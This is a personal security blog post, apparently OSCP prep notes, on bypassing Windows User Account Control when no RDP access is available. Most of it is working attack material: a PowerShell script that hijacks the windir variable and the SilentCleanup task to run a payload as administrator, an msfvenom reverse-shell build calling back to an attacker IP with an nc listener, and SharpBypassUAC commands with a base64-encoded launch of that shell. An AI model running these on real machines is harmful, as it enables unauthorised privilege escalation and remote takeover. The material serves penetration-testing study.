---
title: UAC bypass - why and how
date: 2022-06-05 12:20:00 -0600
categories: [UAC bypass, OSCP]
tags: [uac bypass, oscp]
---

# UAC bypass - why and how

As a hacker sometimes you will land on a windows machine as a user that has admin rights, but anything you try and do that will require admin rights will (mimikatz anyone?) get blocked by UAC. 

The benefits of UAC are listed [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview#:~:text=User%20Account%20Control%20(UAC,changes%20to%20system%20settings.)) but boil down to blocking automatic execution of malware and also gives a user a second chance to say no to something that they clicked on.

If you can RDP into the machine then they bypass is easy. Just click yes instead of no.

This post is for when you don't have RDP access into the box. I have two optoins that I use that have worked for me.

## Option 1 via powershell script:

```powershell
if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator
    C:\Users\beaux\Downloads\rev.exe
} else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
}
```
Credit to this forum post <https://forums.hak5.org/topic/45439-powershell-real-uac-bypass/>

## Option 2 via SharpBypassUAC

[SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC) has a bunch of options for bypassing UAC. Most of them are a "will not fix" from Microsoft. They don't consider it a real security issue.

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=4433 -f exe -o rev.exe`

`rlwrap nc -lnvp 4433`

Then back on the victim machine:

`SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IEM6XFVzZXJzXGJlYXV4XERvd25sb2Fkc1xyZXYuZXhlIA==`

The last part is base 64:

```bash
echo Y21kIC9jIHN0YXJ0IEM6XFVzZXJzXGJlYXV4XERvd25sb2Fkc1xyZXYuZXhlIA== | base6
4 -d
cmd /c start C:\Users\beaux\Downloads\rev.exe
```

There are a few other options besides `-b eventvwr` that can be found on their github repo <https://github.com/FatRodzianko/SharpBypassUAC>

```
Example usage for eventvwr bypass to launch calc.exe
SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl

Example usage for fodhelper bypass to launch calc.exe
SharpBypassUAC.exe -b fodhelper -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl

Example usage for computerdefaults bypass to launch calc.exe
SharpBypassUAC.exe -b computerdefaults -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl

Example usage for sdclt bypass to launch calc.exe
SharpBypassUAC.exe -b sdclt -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl

Note: this appears to only work on Windows 10 in my testing
Example usage for slui bypass to launch calc.exe
SharpBypassUAC.exe -b slui -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhl

Example usage for DiskCleanup bypass to launch calc.exe
SharpBypassUAC.exe -b dikcleanup -e Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==

Note: The command you execute will need to end in "&& REM"
```


If you are using it just for testing in htb or proving grounds you can grab the precompiled executable here:
<https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpBypassUAC.exe> 



> If you are using this on an actual pentest I would compile it yourself, just in case.
{: .prompt-warning }